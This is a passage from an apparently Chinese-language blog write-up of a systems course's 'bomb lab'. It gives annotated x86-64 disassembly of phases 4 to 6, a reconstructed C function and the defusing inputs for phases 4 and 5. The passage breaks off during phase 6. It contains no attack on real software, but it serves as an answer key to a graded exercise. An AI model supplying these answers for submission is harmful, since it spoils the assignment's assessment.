class="comment">; eax = j - i</span></span><br><span class="line"><span class="number">0x0000000000400fd6</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    %eax,%ecx</span><br><span class="line"><span class="number">0x0000000000400fd8</span> &lt;+<span class="number">10</span>&gt;:<span class="keyword">shr</span>    <span class="number">$0</span>x1f,%ecx</span><br><span class="line"><span class="number">0x0000000000400fdb</span> &lt;+<span class="number">13</span>&gt;:<span class="keyword">add</span>    %ecx,%eax <span class="comment">;判断eax的符号</span></span><br><span class="line"><span class="number">0x0000000000400fdd</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">sar</span>    %eax <span class="comment">;eax /= 2</span></span><br><span class="line"><span class="number">0x0000000000400fdf</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">lea</span>    (%rax,%rsi,<span class="number">1</span>),%ecx <span class="comment">;val = eax + i = (j + i) / 2</span></span><br><span class="line"><span class="number">0x0000000000400fe2</span> &lt;+<span class="number">20</span>&gt;:<span class="keyword">cmp</span>    %edi,%ecx <span class="comment">; 比较输入和 val</span></span><br><span class="line"><span class="number">0x0000000000400fe4</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x400ff2</span> &lt;func4+<span class="number">36</span>&gt; <span class="comment">;如果输入小于或等于 val，则跳转</span></span><br><span class="line"><span class="number">0x0000000000400fe6</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">lea</span>    -<span class="number">0x1</span>(%rcx),%edx</span><br><span class="line"><span class="number">0x0000000000400fe9</span> &lt;+<span class="number">27</span>&gt;:callq  <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000400fee</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">add</span>    %eax,%eax</span><br><span class="line"><span class="number">0x0000000000400ff0</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ff2</span> &lt;+<span class="number">36</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line"><span class="number">0x0000000000400ff7</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">cmp</span>    %edi,%ecx</span><br><span class="line"><span class="number">0x0000000000400ff9</span> &lt;+<span class="number">43</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ffb</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x1</span>(%rcx),%esi</span><br><span class="line"><span class="number">0x0000000000400ffe</span> &lt;+<span class="number">48</span>&gt;:callq  <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000401003</span> &lt;+<span class="number">53</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line"><span class="number">0x0000000000401007</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line"><span class="number">0x000000000040100b</span> &lt;+<span class="number">61</span>&gt;:retq</span><br></pre></td></tr></table></figure><p>这个函数有点绕，大概是做一个二分，具体的内容写在注释里，自己可以用笔模拟下这个函数在干嘛，可以推断出C语言代码大致如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val = (j + i) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val &gt;= n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">2</span> * func4(n, val+<span class="number">1</span>, j) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(n, i, val<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>共有四组可能的答案让这个函数返回0:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 0</span><br><span class="line">1 0</span><br><span class="line">3 0</span><br><span class="line">7 0</span><br></pre></td></tr></table></figure></p><p>这题还是有一定难度的</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>……<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   %rbx</span><br><span class="line"><span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x20,%rsp</span><br><span class="line"><span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:<span class="keyword">mov</span>    %rdi,%rbx</span><br><span class="line"><span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax <span class="comment">;防护代码，设置一个canary，可以不管它</span></span><br><span class="line"><span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">mov</span>    %rax,<span class="number">0x18</span>(%rsp)</span><br><span class="line"><span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">xor</span>    %eax,%eax</span><br><span class="line"><span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:callq  <span class="number">0x40131b</span> &lt;string_length&gt;</span><br><span class="line"><span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x6,%eax<span class="comment">;要求获取一个长度为6的字符串</span></span><br><span class="line"><span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:movzbl (%rbx,%rax,<span class="number">1</span>),%ecx</span><br><span class="line"><span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">mov</span>    %cl,(%rsp)</span><br><span class="line"><span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">mov</span>    (%rsp),%rdx</span><br><span class="line"><span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">and</span>    <span class="number">$0</span>xf,%edx<span class="comment">;获取当前字符的后四位</span></span><br><span class="line"><span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:movzbl <span class="number">0x4024b0</span>(%rdx),%edx<span class="comment">;某个地方存了个字符串，每次获取第%rdx个字符，%rdx从输入所获得的字符的后四位</span></span><br><span class="line"><span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)<span class="comment">;保存截取的字符</span></span><br><span class="line"><span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x1,%rax<span class="comment">;每次读取一个字符，类似++i</span></span><br><span class="line"><span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x6,%rax</span><br><span class="line"><span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;<span class="comment">;读取6次</span></span><br><span class="line"><span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:movb   <span class="number">$0</span>x0,<span class="number">0x16</span>(%rsp)</span><br><span class="line"><span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x40245e,%esi<span class="comment">;一个字符串</span></span><br><span class="line"><span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line"><span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:callq  <span class="number">0x401338</span> &lt;strings_not_equal&gt;<span class="comment">;字符串相等判断</span></span><br><span class="line"><span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:<span class="keyword">test</span>   %eax,%eax</span><br><span class="line"><span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;<span class="comment">;相等则过关</span></span><br><span class="line"><span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</span><br><span class="line"><span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line"><span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x18</span>(%rsp),%rax</span><br><span class="line"><span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:<span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line"><span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:callq  <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"><span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x20,%rsp</span><br><span class="line"><span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:<span class="keyword">pop</span>    %rbx</span><br><span class="line"><span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:retq</span><br></pre></td></tr></table></figure></p><p>这个程序比较复杂，重要语句注释写在上面的代码里，意思是读取一个长度为6的字符串，对于每个字符截取后四位数字，用来作为index，获取另一个字符串里对应的字符，并保存起来，产生一个新的长度为6的字符串，要求等于另一个字符串。</p><p>解析可以看到，用来被截取的字符串str1为“maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?”(我们发现作者在嘲讽我们:) )，用来对比的字符串str2为“flyers”，我们发现flyers6个字符分别出现在str1的第9位，第15位，第14位，第5位，第6位，第7位，输入的字符串后四位的二进制只要分别表示9,15,14,5,6,7即可，翻查ASCII表，可以得到结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ionefg</span><br></pre></td></tr></table></figure></p><p>这题更像密码破解了</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000004010f4</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   %r14</span><br><span class="line"><span class="number">0x00000000004010f6</span> &lt;+<span class="number">2</span>&gt;:<span class="keyword">push</span>   %r13</span><br><span class="line"><span class="number">0x00000000004010f8</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">push</span>   %r12</span><br><span class="line"><span class="number">0x00000000004010fa</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">push</span>   %rbp</span><br><span class="line"><span class="number">0x00000000004010fb</span> &lt;+<span class="number">7</span>&gt;:<span class="keyword">push</span>   %rbx</span><br><span class="line"><span class="number">0x00000000004010fc</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x50,%rsp</span><br><span class="line"><span class="number">0x0000000000401100</span> &lt;+<span class="number">12</span>&gt;:<span class="keyword">mov</span>    %rsp,%r13</span><br><span class="line"><span class="number">0x0000000000401103</span> &lt;+<span class="number">15</span>&gt;:<span class="keyword">mov</span>    %rsp,%rsi</span><br><span class="line"><span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:callq  <span class="number">0x40145c</span> &lt;read_six_numbers&gt; <span class="comment">;读6个数字，老朋友了</span></span><br><span class="line"><span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:<span class="keyword">mov</span>    %rsp,%r14</span><br><span class="line"><span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%r12d</span><br><span class="line"><span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">mov</span>    %r13,%rbp</span><br><span class="line"><span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x0</span>(%r13),%eax</span><br><span class="line"><span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"><span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x5,%eax <span class="comment">;-1然后与5比较</span></span><br><span class="line"><span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x1,%r12d</span><br><span class="line"><span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x6,%r12d <span class="comment">;六次循环，每个数字要满足小于等于6</span></span><br><span class="line"><span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">je</span>     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    %r12d,%ebx</span><br><span class="line"><span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:movslq %ebx,%rax</span><br><span class="line"><span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:<span class="keyword">mov</span>    (%rsp,%rax,<span class="number">4</span>),%eax</span><br><span class="line"><span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">cmp</span>    %eax,<span class="number">0x0</span>(%rbp)</span><br><span class="line"><span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt; <span class="comment">;每个数字不相等</span></span><br><span class="line"><span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x1,%ebx</span><br><span class="line"><span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x5,%ebx</span><br><span class="line"><span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line"><span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x4,%r13</span><br><span class="line"><span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x18</span>(%rsp),%rsi</span><br><span class="line"><span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">mov</span>    %r14,%rax</span><br><span class="line"><span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x7,%ecx</span><br><span class="line"><span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:<span class="keyword">mov</span>    %ecx,%edx</span><br><span class="line"><span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">sub</span>    (%rax),%edx<span class="comment">;与7求差</span></span><br><span class="line"><span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    %edx,(%rax)<span class="comment">; 结果放入原来的位置</span></span><br><span class="line"><span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x4,%rax</span><br><span class="line"><span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">cmp</span>    %rsi,%rax</span><br><span class="line"><span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;<span class="comment">;每个数字与7的差，循环</span></span><br><span class="line"><span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</span><br><span class="line"><span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x8</span>(%rdx),%rdx<span class="comment">; next指针</span></span><br><span class="line"><span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"><span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:<span class="keyword">cmp</span>    %ecx,%eax</span><br><span class="line"><span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</span><br><span class="line"><span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:<span class="keyword">mov</span>    %rdx,<span class="number">0x20</span>(%rsp,%rsi,<span class="number">2</span>)</span><br><span class="line"><span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x4,%rsi</span><br><span class="line"><span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x18,%rsi</span><br><span class="line"><span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:<span class="keyword">mov</span>    (%rsp,%rsi,<span class="number">1</span>),%ecx<span class="comment">; 重新安排链表</span></span><br><span class="line"><span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:<span class="keyword">cmp</span>    <span class="number">$0</span>x1,%ecx</span><br><span class="line"><span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line"><span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line"><span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x6032d0,%edx</span><br><span class="line"><span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x20</span>(%rsp),%rbx</span><br><span class="line"><span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x28</span>(%rsp),%rax</span><br><span class="line"><span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x50</span>(%rsp),%rsi</span><br><span class="line"><span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:<span class="keyword">mov</span>    %rbx,%rcx</span><br><span class="line"><span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:<span class="keyword">mov</span>    (%rax),%rdx</span><br><span class="line"><span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:<span class="keyword">mov</span>    %rdx,<span class="number">0x8</span>(%rcx)</span><br><span class="line"><span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x8,%rax</span><br><span class="line"><span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:<span class="keyword">cmp</span>    %rsi,%rax</span><br><span class="line"><span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:<span class="keyword">mov</span>    %rdx,%rcx</span><br><span class="line"><span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:<span class="keyword">movq</span>   <span class="number">$0</span>x0,<span class="number">0x8</span>(%rdx)</span><br><span class="line"><span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:<span class="keyword">mov</span>    <span class="number">$0</span>x5,%ebp</span><br><span class="line"><span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rax</span><br><span class="line"><span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:<span class="keyword">mov</span>    (%rax),%eax</span><br><span class="line"><span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:<span class="keyword">cmp</span>    %eax,(%rbx)</span><br><span class="line"><span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;<span class="comment">;链表每个节点所对应的值要求严格递减</span></span><br><span class="line"><span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:callq  <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:<span class="keyword">mov</span>    <span class="number">0x8</span>(%rbx),%rbx</span><br><span class="line"><span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x1,%ebp</span><br><span class="line"><span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:<span class="keyword">add</span>    <span class="number">$0</span>x50,%rsp</span><br><span class="line"><span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:<span class="keyword">pop</span>    %rbx</span><br><span class="line"><span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:<span class="keyword">pop</span>    %rbp</span><br><span class="line"><span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:<span class="keyword">pop</span>    %r12</span><br><span class="line"><span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:<span class="keyword">pop</span>    %r13</span><br><span class="line"><span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:<span class="keyword">pop</span>    %r14</span><br><span class="line"><span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:retq</span><br></pre></td></tr></table></figure><p>这是最后一道题，也是最难的一题，Prof在上课的时候也强调了hard for best 